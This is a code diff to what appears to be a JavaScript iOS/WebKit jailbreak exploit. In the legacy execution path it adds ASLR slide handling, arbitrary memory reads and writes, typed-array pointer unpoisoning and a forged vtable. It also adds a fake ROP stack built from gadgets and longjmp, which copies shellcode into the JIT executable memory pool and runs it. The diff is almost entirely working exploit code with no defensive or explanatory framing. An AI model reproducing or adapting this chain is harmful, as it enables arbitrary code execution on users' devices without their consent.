@@ -13,8 +13,7 @@ using('libaddressspace');
 using('libc');
 
 var memdump_addr = 0;
-
-
+var dyld_shared_cache_base = 0x180000000;
 
 var UNITY = {};
 UNITY.TEN = 10;
@@ -439,7 +438,65 @@ var pwn = function() {
 
     function legacy_execution() {
         alert('Legacy iPhones (< iPhone 8) can not be jailbroken yet.');
-        if(CONFIG.MEMORYDUMP_ENABLED) print('Memory Dump Result: \n'+memorydump(dlsym, CONFIG.MEMDUMP_SIZE, stage2));
+        if(CONFIG.MEMORYDUMP_ENABLED) print('Memory Dump Result: \n'+memorydump(dyld_shared_cache_base + slide, CONFIG.MEMDUMP_SIZE, stage2));
+        var callback_vector = stage2.read64(callbacks);
+        var poison = stage2.read64(g_typedArrayPoisons + 6*8);
+        var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);
+
+        var shellcode_src = buffer_addr + 0x4000;
+        var shellcode_dst = endOfFixedExecutableMemoryPool - CONFIG.MAX_SHELLCODE_SIZE;
+
+        if (shellcode_dst < startOfFixedExecutableMemoryPool) {
+            fail(4);
+        }
+
+        stage2.write64(shellcode_src + 4, dlsym);
+                  
+        var fake_stack = [
+            0,
+            shellcode_length,  // x2
+            0,
+            
+            pop_x8,
+            
+            0, 0, 0, 0, 0,
+            shellcode_dst, // x8
+            0, 0, 0, 0,
+            stage2.read64(ptr_stack_check_guard) + 0x58,
+            
+            linkcode_gadget,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+            
+            shellcode_dst
+        ];
+                  
+        u32_buffer[0] = longjmp % BASE32;
+        u32_buffer[1] = longjmp / BASE32;
+
+        for (var i = 0; i < fake_stack.length; ++i) {
+              u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
+              u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
+        }
+
+        stage2.write_non_zero(el_addr, [
+            buffer_addr, // fake vtable
+            0,
+            shellcode_src, // x21
+            0, 0, 0, 0, 0, 0, 0,
+            0, // fp
+
+            pop_x2, // lr
+            0,
+            buffer_addr + 0x2000, // sp
+        ]);
+         if (b2hex(stage2.read64(el_addr + 16)) === b2hex(shellcode_src)) {
+            print('shellcode is at: ' + b2hex(shellcode_dst));
+        } else {
+            fail('Failed writing shellcode');
+            return false;
+        }
+        wrapper.addEventListener('click', function(){});
     }
 
     function modern_execution() {
